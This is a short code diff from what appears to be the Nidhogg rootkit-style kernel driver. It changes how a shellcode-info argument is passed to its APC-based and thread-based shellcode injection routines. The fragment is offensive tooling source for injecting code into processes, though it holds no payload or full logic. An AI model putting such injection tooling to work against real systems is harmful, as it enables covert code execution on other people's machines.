@@ -80,7 +80,7 @@ NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARG
 			break;
 		}
 
-		status = NidhoggMemoryHandler->InjectShellcodeAPC(&shellcodeInfo);
+		status = NidhoggMemoryHandler->InjectShellcodeAPC(shellcodeInfo);
 		break;
 	}
 	case Options::Thread:
@@ -92,7 +92,7 @@ NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARG
 			break;
 		}
 
-		status = NidhoggMemoryHandler->InjectShellcodeThread(&shellcodeInfo);
+		status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
 		break;
 	}
 	default:
